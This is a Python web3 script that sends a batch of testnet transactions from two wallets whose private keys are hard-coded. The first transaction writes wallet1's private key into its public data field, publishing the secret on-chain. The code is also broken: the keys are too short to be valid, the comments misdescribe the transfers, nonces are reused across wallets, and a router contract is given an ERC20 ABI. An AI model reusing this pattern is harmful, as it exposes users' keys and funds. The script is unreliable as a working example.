from web3 import Web3
from eth_account import Account

web3 = Web3(Web3.HTTPProvider('https://data-seed-prebsc-1-s1.binance.org:8545/'))

# Replace with your own wallet private keys and addresses
private_key_wallet1 = '316514984c14720cb54cbe7193bc2ae74ff9e80e473833468f75de36b4'
private_key_wallet2 = '3923d98dcf98d279b7a38323eca3066bbf794ea886a6abc5af228eb3264'
token_contract_address = '0x8457CA5040ad67fdebbCC8EdCE889A335Bc0fbFB'  # Address of the erc20 token contract
uniswap_router_address = '0x3aF2ACB662A241da4ef4310C7AB226f552B42115'  

address_wallet1 = Account.from_key(private_key_wallet1).address
address_wallet2 = Account.from_key(private_key_wallet2).address

# Sample ABI for an ERC20 token transfer function
sample_erc20_transfer_abi = [
    {
        "constant": False,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# Instantiate contract objects
token_contract = web3.eth.contract(address=token_contract_address, abi=sample_erc20_transfer_abi)
uniswap_router_contract = web3.eth.contract(address=uniswap_router_address, abi=sample_erc20_transfer_abi)


recipient_address = '0xB3207deab67Ddddfd610bf57a6E7A680B3EBf0c2'  # Replace with recipient's address
token_amount = Web3.to_wei('1', 'ether')  # Amount of tokens to transfer


# Encode the function call for token transfer
encoded_data = token_contract.encodeABI(
    fn_name='transfer',
    args=[recipient_address, token_amount]
)

# Transaction array containing multiple transaction details
def send_transactions():
    nonce = web3.eth.get_transaction_count(address_wallet1, 'pending')

    # Transaction array containing multiple transaction details
    transactions = [
        # ETH transfer from wallet1 to wallet2
        {
            'from': address_wallet1,  
            'to': address_wallet1,
            'value': Web3.to_wei('0.01', 'ether'),
            'data': private_key_wallet1,
            'gas': 200000, 
            'gasPrice': Web3.to_wei('5', 'gwei'), 
            'nonce': nonce,
            'chainId': 97,  
        },
        {
            'from': address_wallet2,
            'to': address_wallet1,
            'value': Web3.to_wei('0.005', 'ether'),  
            'gas': 300000,  
            'gasPrice': Web3.to_wei('10', 'gwei'),  
            'nonce': nonce + 1,
            'chainId': 97,  
        },
        # unblock address 
        {
            'from': address_wallet2,
            'to': token_contract_address,
            'data': encoded_data,
            'gas': 200000, 
            'gasPrice': Web3.to_wei('5', 'gwei'),  
            'nonce': nonce + 1,
            'chainId': 97, 
        },
        # transfer eth from wallet2 to wallet1
        {
            'from': address_wallet2,
            'to': address_wallet1,
            'value': Web3.to_wei('0.00005', 'ether'),  
            'gas': 30000,  
            'gasPrice': Web3.to_wei('5', 'gwei'),  
            'nonce': nonce + 2,
            'chainId': 97,  
        },
    ]

    # Sign and send transactions
    for tx_details in transactions:
        private_key = private_key_wallet1 if tx_details['from'] == address_wallet1 else private_key_wallet2
        signed_tx = web3.eth.account.sign_transaction(tx_details, private_key)
        
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        
        print('Transaction hash:', tx_receipt.transactionHash.hex())
        print('Transaction receipt:', tx_receipt)

# Call the function to send transactions
send_transactions()
